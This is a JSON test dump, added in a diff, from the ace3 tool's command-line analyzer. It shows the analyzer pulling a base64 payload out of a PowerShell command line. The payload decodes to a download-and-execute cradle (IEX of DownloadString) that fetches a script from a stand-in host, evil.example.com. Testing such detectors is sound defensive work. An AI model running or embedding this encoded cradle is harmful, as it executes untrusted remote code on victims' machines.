@@ -1,0 +1,62 @@
+{
+  "about": "One ace3 module's analysis of one observable in the cli analysis mode, written by tools/ace3/dumps/run_module.py.",
+  "ace3_commit": "f72f8946",
+  "also_enabled": [],
+  "analyses": [
+    {
+      "class": "CommandLineAnalysis",
+      "details": {
+        "base64_payloads": [
+          {
+            "base64": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBhAC4AcABzADEAIgApADsAIAA=",
+            "file_path": "<root>/files/command_line_base64_payload.bin"
+          }
+        ],
+        "file_paths": []
+      },
+      "detections": [],
+      "module_path": "saq.modules.command_line:CommandLineAnalysis",
+      "observables": [
+        {
+          "detections": [],
+          "directives": [
+            "yara_meta:type=payload.base64"
+          ],
+          "excluded_analysis": [],
+          "file_path": "command_line_base64_payload.bin",
+          "relationships": [],
+          "size": 320,
+          "tags": [
+            "base64"
+          ],
+          "type": "file",
+          "value": "b20d51620bff22669efa8652f2a7fb51fef4c89c9af1c41b878782832605aaee",
+          "yara_meta": [
+            "type=payload.base64"
+          ]
+        }
+      ],
+      "summary": "Command Line Analysis: extracted  1 base64 payloads",
+      "tags": []
+    }
+  ],
+  "input": {
+    "directives": [],
+    "label": "command_line pwsh -c \"Invoke-Thing SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBhAC4AcABzADEAIgApADsAIAA=\"",
+    "meta_tags": [],
+    "observable": {
+      "type": "command_line",
+      "value": "pwsh -c \"Invoke-Thing SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBhAC4AcABzADEAIgApADsAIAA=\""
+    }
+  },
+  "module": "command_line_analyzer",
+  "observable_after": {
+    "detections": [],
+    "directives": [],
+    "excluded_analysis": [],
+    "relationships": [],
+    "tags": [],
+    "type": "command_line",
+    "value": "pwsh -c \"Invoke-Thing SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBhAC4AcABzADEAIgApADsAIAA=\""
+  }
+}
